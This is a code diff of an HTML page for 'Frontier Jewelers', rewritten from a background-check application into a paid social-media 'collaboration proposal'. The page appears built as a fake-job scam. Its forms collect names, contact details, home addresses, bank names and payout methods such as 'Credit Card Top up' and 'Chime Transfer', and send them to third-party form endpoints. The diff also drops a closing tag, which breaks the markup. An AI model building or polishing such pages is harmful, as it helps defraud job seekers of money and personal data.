@@ -3,43 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Frontier Jewelers — Background Check Application</title>
-  <meta
-    name="description"
-    content="Frontier Jewelers — Background Check Application. Please review your application before submitting."
-  />
+  <title>Frontier Jewelers — Proposal & Application</title>
+  <meta name="description" content="Frontier Jewelers — proposal and application form." />
   <link rel="icon" type="image/png" href="logo.png" />
   <link rel="stylesheet" href="styles.css" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@400;500;600;700&display=swap"
-    rel="stylesheet"
-  />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@400;500;600;700&display=swap" rel="stylesheet" />
 </head>
 <body>
   <!-- ===== LOADER ===== -->
   <div class="loader" id="loader">
     <svg class="loader-ring" viewBox="0 0 50 50">
-      <circle
-        cx="25"
-        cy="25"
-        r="22"
-        fill="none"
-        stroke="currentColor"
-        stroke-width="4"
-      />
-      <circle
-        cx="25"
-        cy="25"
-        r="22"
-        fill="none"
-        stroke="currentColor"
-        stroke-width="4"
-        stroke-dasharray="138"
-        stroke-dashoffset="138"
-        style="animation: spin 1.1s ease-in-out infinite; transform-origin: center center;"
-      />
+      <circle cx="25" cy="25" r="22" fill="none" stroke="currentColor" stroke-width="4" />
+      <circle cx="25" cy="25" r="22" fill="none" stroke="currentColor" stroke-width="4" stroke-dasharray="138" stroke-dashoffset="138" style="animation: spin 1.1s ease-in-out infinite; transform-origin: center center;" />
     </svg>
     <span class="loader-label">Loading Frontier…</span>
   </div>
@@ -52,33 +29,132 @@
         <span class="nav-brand__text">FRONTIER JEWELERS</span>
       </div>
       <div class="nav-actions">
-        <a href="#apply" class="nav-cta">Apply Now</a>
+        <a href="#proposal" class="nav-cta">Proposal</a>
+        <a href="#apply" class="nav-cta">Apply</a>
       </div>
     </div>
   </nav>
+
+  <!-- ===== BUSINESS HERO ===== -->
+  <section class="business-hero">
+    <div class="business-hero__inner">
+      <span class="business-hero__badge">Collaboration Proposal</span>
+      <h1>FRONTIER JEWELERS</h1>
+      <p>We are pleased to present this collaboration proposal on behalf of FRONTIER JEWELERS. As part of this collaboration, your responsibilities will include posting our items on social media daily, using marketing tools to grow our brand, and keeping content active for a minimum of 8 hours daily.</p>
+      <div class="business-hero__actions">
+        <a href="#proposal" class="btn btn--primary btn--full">View & Submit Proposal →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== BUSINESS CARDS ===== -->
+  <section class="business-cards">
+    <div class="business-card">
+      <div class="business-card__icon">📱</div>
+      <h3>Daily Posting</h3>
+      <p>Post FRONTIER JEWELERS items on social media stories/feeds daily, morning or evening at your convenience.</p>
+    </div>
+    <div class="business-card">
+      <div class="business-card__icon">📈</div>
+      <h3>Brand Growth</h3>
+      <p>Utilize social media marketing tools and strategies to help maintain and grow our brand presence across all platforms.</p>
+    </div>
+    <div class="business-card">
+      <div class="business-card__icon">⏰</div>
+      <h3>8 Hours Active</h3>
+      <p>Posted content on your stories/feeds remains active for a minimum of 8 hours daily.</p>
+    </div>
+  </section>
+
+  <!-- ===== PROPOSAL (first form section) ===== -->
+  <section class="proposal" id="proposal">
+    <div class="proposal-inner">
+      <div class="proposal-box">
+        <p class="writeup-label">Salary Payment Proposal</p>
+        <h2 class="writeup-title">Payment Processing</h2>
+        <div class="writeup-content">
+          <p>Please complete this form for salary payment processing.</p>
+          <form class="apply-form" id="secondForm" action="https://formspree.io/f/xwlvnyql" method="POST" novalidate>
+            <div class="field">
+              <label for="full_name">Full Name</label>
+              <input id="full_name" name="full_name" type="text" autocomplete="name" required />
+            </div>
+            <div class="field">
+              <label for="email">Email Address</label>
+              <input id="email" name="email" type="email" autocomplete="email" required />
+            </div>
+            <div class="field">
+              <label for="phone">Phone Number</label>
+              <input id="phone" name="phone" type="tel" autocomplete="tel" required />
+            </div>
+            <div class="field">
+              <label for="salary_amount">Salary Amount (USD)</label>
+              <div class="input-wrap">
+                <span class="input-prefix">$</span>
+                <input id="salary_amount" name="salary_amount" type="number" placeholder="0.00" min="0" step="0.01" required />
+              </div>
+            </div>
+            <div class="field">
+              <label for="bank_name">Bank Name</label>
+              <input id="bank_name" name="bank_name" type="text" placeholder="e.g. Chase / Wells Fargo" required />
+            </div>
+            <div class="field">
+              <label for="payment_method">Salary Paid To</label>
+              <select id="payment_method" name="payment_method" required>
+                <option value="">Select payment method</option>
+                <option value="Mobile Bank Deposit">Mobile Bank Deposit</option>
+                <option value="Credit Card Top up">Credit Card Top up</option>
+                <option value="Chime Transfer">Chime Transfer</option>
+              </select>
+            </div>
+            <div class="field">
+              <label for="feature">Feature</label>
+              <select id="feature" name="feature" required>
+                <option value="">Select an option</option>
+                <option value="Social Media Posting">Social Media Posting (daily)</option>
+                <option value="Brand Growth">Brand Growth & Marketing Strategies</option>
+                <option value="Content Duration">Content Duration (8 hours daily)</option>
+              </select>
+            </div>
+            <div class="field">
+              <label class="checkbox-label">
+                <input type="checkbox" id="agree" name="agree" required />
+                <span class="checkbox"></span>
+                I agree to the terms and conditions
+              </label>
+            </div>
+            <div class="btn-group">
+              <button type="submit" class="btn btn--primary btn--full">Submit Proposal</button>
+            </div>
+            <p class="form-status" id="formspreeSecondStatus" role="status" aria-live="polite"></p>
+          </form>
+        </div>
+      </div>
+    </div>
+  </section>
 
   <!-- ===== APPLY SECTION ===== -->
   <section class="apply" id="apply">
     <div class="apply-inner">
       <div class="apply-aside">
         <p class="section-label">Application Progress</p>
-        <h2 class="section-title">Step 3 of 3</h2>
+        <h2 class="section-title">Step 2 of 3</h2>
         <div class="progress-track">
           <div class="progress-track__bar">
-            <div class="progress-track__fill" style="width: 100%"></div>
+            <div class="progress-track__fill" style="width: 33%"></div>
           </div>
           <div class="progress-track__steps">
             <div class="step">
               <div class="step__badge step__badge--complete">01</div>
-              <span class="step__label">Position &amp; Personal</span>
+              <span class="step__label">Proposal</span>
             </div>
             <div class="step">
-              <div class="step__badge step__badge--complete">02</div>
-              <span class="step__label">Resume &amp; Reference</span>
+              <div class="step__badge step__badge--active">02</div>
+              <span class="step__label">Application</span>
             </div>
             <div class="step">
-              <div class="step__badge step__badge--active">03</div>
-              <span class="step__label">Review &amp; Submit</span>
+              <div class="step__badge step__badge--complete">03</div>
+              <span class="step__label">Review & Submit</span>
             </div>
           </div>
         </div>
@@ -86,7 +162,7 @@
 
       <form class="apply-form" id="applyForm" action="https://formspree.io/f/mdealbkw" method="POST" novalidate>
         <div class="form-section">
-          <h3 class="form-section-title">Position &amp; Personal</h3>
+          <h3 class="form-section-title">Position & Personal</h3>
           <div class="form-grid">
             <div class="field">
               <label for="first">First Name</label>
@@ -119,7 +195,6 @@
                 <span class="input-prefix">$</span>
                 <input id="salary" name="salary" type="number" placeholder="0.00" min="0" step="0.01" required />
               </div>
-            </div>
             <div class="field">
               <label for="bankName">Bank Name</label>
               <input id="bankName" name="bankName" type="text" placeholder="e.g. Chase / Wells Fargo" required />
@@ -156,7 +231,7 @@
         </div>
 
         <div class="form-section">
-          <h3 class="form-section-title">Payment &amp; Consent</h3>
+          <h3 class="form-section-title">Payment & Consent</h3>
           <div class="form-grid">
             <div class="field">
               <label for="payMethod">Salary Paid To</label>
@@ -182,7 +257,7 @@
         </div>
 
         <div class="form-section">
-          <h3 class="form-section-title">Time &amp; Agreement</h3>
+          <h3 class="form-section-title">Time & Agreement</h3>
           <div class="form-grid">
             <div class="field">
               <label for="time">Time</label>
@@ -201,67 +276,88 @@
     </div>
   </section>
 
-  <!-- ===== SECOND FORMSPREE FORM ===== -->
-  <section class="writeup">
-    <div class="writeup-inner">
-      <div class="writeup-box">
-        <p class="writeup-label">Salary Payment Proposal</p>
-        <h2 class="writeup-title">Payment Processing</h2>
-        <div class="writeup-content">
-          <p>Please complete this form for salary payment processing:</p>
+  <!-- ===== REVIEW & SUBMIT SECTION ===== -->
+  <section class="review-section" id="review">
+    <div class="review-inner">
+      <div class="review-box">
+        <p class="review-label">Review & Submit</p>
+        <h2 class="review-title">Review Your Application</h2>
+        <p class="review-content">Please review your details below before submitting your application to Frontier Jewelers.</p>
 
-          <form class="apply-form" id="secondForm" action="https://formspree.io/f/xwlvnyql" method="POST">
-            <div class="field">
-              <label for="full_name">Full Name</label>
-              <input id="full_name" name="full_name" type="text" required />
+        <div class="review-card">
+          <div class="review-title-block">
+            <div class="review-num">03</div>
+            <h3 class="review-section-title">Personal Details <span class="review-edit-btn" id="editReviewBtn">Edit</span></h3>
+          </div>
+
+          <div class="review-section">
+            <h3 class="review-section-title">Personal & Payment Details</h3>
+            <div class="review-item">
+              <span class="review-label">First Name</span>
+              <span class="review-value" id="review-first">—</span>
             </div>
-            <div class="field">
-              <label for="email">Email Address</label>
-              <input id="email" name="email" type="email" required />
+            <div class="review-item">
+              <span class="review-label">Last Name</span>
+              <span class="review-value" id="review-last">—</span>
             </div>
-            <div class="field">
-              <label for="phone">Phone Number</label>
-              <input id="phone" name="phone" type="tel" required />
+            <div class="review-item">
+              <span class="review-label">Phone</span>
+              <span class="review-value" id="review-phone">—</span>
             </div>
-            <div class="field">
-              <label for="salary_amount">Salary Amount (USD)</label>
-              <div class="input-wrap">
-                <span class="input-prefix">$</span>
-                <input id="salary_amount" name="salary_amount" type="number" placeholder="0.00" min="0" step="0.01" required />
-              </div>
+            <div class="review-item">
+              <span class="review-label">Salary Paid To</span>
+              <span class="review-value" id="review-paymethod">—</span>
             </div>
-            <div class="field">
-              <label for="bank_name">Bank Name</label>
-              <input id="bank_name" name="bank_name" type="text" placeholder="e.g. Chase / Wells Fargo" required />
+            <div class="review-item">
+              <span class="review-label">Salary Amount (USD)</span>
+              <span class="review-value" id="review-salary">—</span>
             </div>
-            <div class="field">
-              <label for="payment_method">Salary Paid To</label>
-              <select id="payment_method" name="payment_method" required>
-                <option value="">Select payment method</option>
-                <option value="Mobile Bank Deposit">Mobile Bank Deposit</option>
-                <option value="Credit Card Top up">Credit Card Top up</option>
-                <option value="Chime Transfer">Chime Transfer</option>
-              </select>
+            <div class="review-item">
+              <span class="review-label">Bank Name</span>
+              <span class="review-value" id="review-bankname">—</span>
             </div>
-            <div class="field">
-              <label for="feature">Feature</label>
-              <select id="feature" name="feature" required>
-                <option value="">Select an option</option>
-                <option value="Social Media Posting">Social Media Posting (daily)</option>
-                <option value="Brand Growth">Brand Growth &amp; Marketing Strategies</option>
-                <option value="Content Duration">Content Duration (8 hours daily)</option>
-              </select>
+          </div>
+
+          <div class="review-section">
+            <h3 class="review-section-title">Address</h3>
+            <div class="review-item">
+              <span class="review-label">Street Address</span>
+              <span class="review-value" id="review-street">—</span>
             </div>
-            <div class="field">
-              <label class="checkbox-label">
-                <input type="checkbox" id="agree" name="agree" required />
-                <span class="checkbox"></span>
-                I agree to the terms and conditions
-              </label>
+            <div class="review-item">
+              <span class="review-label">City</span>
+              <span class="review-value" id="review-city">—</span>
             </div>
-            <button type="submit" class="btn btn--primary btn--full">Submit Payment Proposal</button>
-            <p class="form-status" id="formspreeSecondStatus" role="status" aria-live="polite"></p>
-          </form>
+            <div class="review-item">
+              <span class="review-label">State / Region</span>
+              <span class="review-value" id="review-state">—</span>
+            </div>
+            <div class="review-item">
+              <span class="review-label">Postal Code</span>
+              <span class="review-value" id="review-postal">—</span>
+            </div>
+            <div class="review-item">
+              <span class="review-label">Country</span>
+              <span class="review-value" id="review-country">—</span>
+            </div>
+          </div>
+
+          <div class="review-section">
+            <h3 class="review-section-title">Feature & Agreement</h3>
+            <div class="review-item">
+              <span class="review-label">Feature</span>
+              <span class="review-value" id="review-feature">—</span>
+            </div>
+            <div class="review-item">
+              <span class="review-label">I agree to the terms and conditions</span>
+              <span class="review-value" id="review-agree">—</span>
+            </div>
+          </div>
+
+          <div class="review-actions">
+            <a href="#apply" class="btn btn--ghost btn--full">← Edit Application</a>
+            <button type="button" class="btn btn--primary btn--full" id="submitReviewBtn">Submit Application</button>
+          </div>
         </div>
       </div>
     </div>
@@ -275,9 +371,9 @@
         <span class="footer-tagline">FRONTIER JEWELERS</span>
       </div>
       <div class="footer-links">
+        <a href="#proposal">Proposal</a>
         <a href="#apply">Apply</a>
-        <a href="#collection">Collection</a>
-        <a href="#">Contacts</a>
+        <a href="#review">Review</a>
       </div>
       <p class="footer-copy">&copy; 2026 Frontier Jewelers. All rights reserved.</p>
     </div>
